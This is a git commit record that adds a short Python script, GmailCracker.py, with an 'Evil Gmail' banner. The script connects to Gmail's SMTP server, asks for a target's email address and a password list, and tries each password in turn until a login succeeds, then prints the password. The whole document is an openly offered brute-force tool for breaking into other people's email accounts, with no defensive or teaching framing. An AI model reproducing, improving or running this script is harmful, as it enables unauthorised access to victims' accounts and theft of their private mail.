e4475704132402bb7c284293b2d1e5573b6299f8
Caasi <47527704+MrGoku21@users.noreply.github.com>
2019-03-08 10:46:21 +0100

    Add files via upload

---
+++ GmailCracker.py
@@ -0,0 +1,31 @@
+import smtplib
+import time
+
+print ("___________     .__.__      ________               .__.__")   
+print ("\_   _____/__  _|__|  |    /  _____/  _____ _____  |__|  |       Made by Caasi")  
+print (" |    __)_\  \/ /  |  |   /   \  ___ /     \\__  \ |  |  |       https://github.com/MrGoku21") 
+print (" |        \\   /|  |  |__ \    \_\  \  Y Y  \/ __ \|  |  |__")
+print ("/_______  / \_/ |__|____/  \______  /__|_|  (____  /__|____/")
+print ("        \/                        \/      \/     \/")         
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+print ("")
+user = input("Enter the target's email address: ")
+passwfile = input ("Enter the password file name: ")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+    try: 
+        smtpserver.login(user, password)
+        print ("[+] Passsword Found: %s" %password)
+        print ("")
+        time.sleep(1)
+        break;
+
+    except smtplib.SMTPAuthenticationError:
+        print ("")
+        print ("[!] Password wrong: %s" %password)
+
